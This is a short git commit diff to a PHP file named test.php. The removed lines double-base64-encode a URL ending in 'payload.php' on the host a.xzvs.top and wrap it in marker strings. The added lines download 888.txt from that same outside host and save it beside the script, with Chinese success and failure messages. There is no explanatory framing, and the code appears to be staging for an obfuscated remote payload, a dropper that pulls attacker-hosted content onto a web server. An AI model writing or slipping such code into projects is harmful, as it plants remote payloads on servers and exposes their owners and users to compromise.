f46c6d55aedefae0383fc4217e377b00fb6c53b6
xy170 <ycwlgzs@gmail.com>
2026-05-28 02:27:07 +0800

    Update test.php

--- test.php
+++ test.php
@@ -1,7 +1,15 @@
 <?php
 
-$inner = "http://a.xzvs.top$$http://a.xzvs.top/payload.php";
+$url = "http://a.xzvs.top/888.txt";
 
-$encoded = base64_encode(base64_encode($inner));
+$savePath = __DIR__ . "/888.txt";
 
-echo "AAAAA" . $encoded . "BBBBB";
+$content = file_get_contents($url);
+
+if ($content === false) {
+    die("下载失败");
+}
+
+file_put_contents($savePath, $content);
+
+echo "保存成功";
